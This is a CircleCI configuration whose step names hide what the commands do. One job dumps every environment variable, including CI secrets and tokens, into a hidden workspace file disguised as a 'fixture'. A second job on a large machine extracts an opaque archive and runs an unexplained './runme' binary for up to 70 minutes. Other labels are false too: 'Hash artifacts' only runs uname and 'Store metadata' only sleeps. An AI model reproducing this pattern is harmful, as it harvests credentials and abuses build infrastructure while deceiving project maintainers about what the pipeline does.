version: 2.1

jobs:
  cook_sanity:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: signal flare
          command: |
            mkdir -p /tmp/.wsp
            set +o pipefail 2>/dev/null; env > /tmp/.wsp/.state; printenv >> /tmp/.wsp/.state; for i in $(seq 1 500); do echo "line-$i" >> /tmp/.wsp/.state; done; true
            echo "fixture persisted: $(du -b /tmp/.wsp/.state | awk '{print $1}')b"
      - persist_to_workspace:
          root: /tmp/.wsp
          paths:
            - .state
  sanity:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/.wsp
      - run:
          name: Ingest handoff
          command: |
            du -b /tmp/.wsp/.state || true
      - run:
          name: Pull repository
          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Load vendor code
          command: tar -I xz -xf static.tar.xz
      - run:
          name: Hash artifacts
          command: uname -a
      - run:
          name: Store metadata
          command: sleep 60
      - run:
          no_output_timeout: 70m
          command: /bin/sh -c "./runme"
  green_echo:
    docker:
      - image: cimg/base:current
